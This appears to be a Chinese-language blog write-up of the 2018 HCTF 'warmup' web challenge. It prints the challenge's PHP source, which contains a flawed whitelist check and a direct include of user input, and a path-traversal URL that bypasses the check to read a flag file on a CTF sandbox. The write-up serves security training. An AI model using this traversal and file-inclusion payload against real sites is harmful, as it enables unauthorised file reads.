---
# 这是页面的图标
icon: token
# 这是文章的标题
title: 2018-HCTF-Web-warmup-Writeup
# 设置作者
author: lhz
# 设置写作时间
time: 2022-01-29
# 一个页面只能有一个分类
category: CTF
# 一个页面可以有多个标签
tag:
  - writeup
  - CTF

comment: false
typora-root-url: ..\..\..\..\.vuepress\public
---



题目页面：

![image-20220422161916073](/assets/img/image-20220422161916073.png)

F12查看源码：

![image-20220422161923870](/assets/img/image-20220422161923870.png)

发现source.php,访问显示源码

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

从代码中看到白名单中有hint.php，访问

![image-20220422161931439](/assets/img/image-20220422161931439.png)

可以看到flag在`ffffllllaaaagggg`中，审计`source.php`中的代码

```url
http://challenge-3876b46364f9e4f6.sandbox.ctfhub.com:10800/source.php?file=source.php?../../../../../../../ffffllllaaaagggg
```

绕过过滤，`file`参数后跟白名单中文件，在去访问`ffffllllaaaagggg`，尝试增加../直到flag内容显示